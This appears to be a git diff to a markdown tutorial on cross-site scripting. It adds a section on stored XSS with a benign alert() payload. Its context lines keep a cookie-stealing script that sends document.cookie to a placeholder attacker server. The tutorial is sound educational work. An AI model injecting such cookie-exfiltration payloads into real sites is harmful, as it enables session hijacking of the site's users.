@@ -83,9 +83,34 @@ image.src='http://attacker_server_ip/?c='+document.cookie;</script>
 ```
 
 This example of an XSS attack sends a request to the attack with the victims cookie as a URL parameter. 
-
 ## Types of XSS
+There are 3 kinds of XSS attacks and the factor that differentiates them is how the payload travels before it gets delivered to the user. 
+There are also a few XSS flaws that fall into their own special categories. 
 #### Stored XSS
+Occurs when the user input is stored on a server and retrieved unsafely.
+The app doesn't validate user input, it stores it on its server and renderings it without being sanitized.
+This is the most severe type of XSS attack, potential of attacking many or all users, only viewing the page is required to suffer this attack.
+Attackers manage to permanently save their malicious code on the server for others to access.
+We could see things like databases being affected, accessing server logs, etc.
+For example a user can submit code in a comment field that could alter the page if the input isn't properly sanitized. 
+
+```html
+<script>alert('XSS by Drew')</script>
+```
+
+Submitting this code would be updated to look like this.
+
+```html
+<h2>Andrew's message</h2>
+<p>What a great post! Thanks for sharing.</p>
+<h2>Attacker's message</h2>
+<p><script>alert('XSS by Drew')</script></p>
+```
+
+The comment field will display as blank but its running whatever code you type between the script tags, every time a user visits this page the malicious code will execute. 
+
+Upon submitting it would become embedded on the forums pages HTML code.
+
 #### Blind XSS
 #### Reflected XSS
 #### DOM Based XSS
